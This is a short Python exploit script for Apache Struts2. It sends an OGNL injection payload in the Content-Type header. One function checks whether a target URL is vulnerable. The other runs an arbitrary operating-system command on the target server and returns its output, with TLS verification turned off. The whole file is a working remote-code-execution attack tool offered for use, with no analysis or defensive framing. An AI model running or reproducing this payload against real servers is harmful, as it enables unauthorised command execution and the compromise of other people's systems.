# -*- coding: utf-8 -*-
#author: cwbird
import requests
import sys
import config
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exp_check(url):
    payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('hello')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}"
    headers = {}
    headers["Content-Type"] = payload
    try:
        r = requests.post(url,headers=headers,verify= False)
        if r"hello" in r.text:
            return 1
        return 2
    except:
        return 3


def exp_cmd(url,cmd):
    payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('"+cmd+"'.toString().split('\\\s'))).start().getInputStream()).useDelimiter('\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}"
    headers = {}
    headers["Content-Type"] = payload
    try:
        r = requests.post(url, headers=headers,timeout=5,verify= False)
        # print(r.text)
        return r.text
    except:
        return 3
        
if __name__ == '__main__':
    pass
    # url = sys.argv[1]
    # cmd=sys.argv[2]
    #
    # print(exp_check(url))
    # exp_cmd(url,cmd)
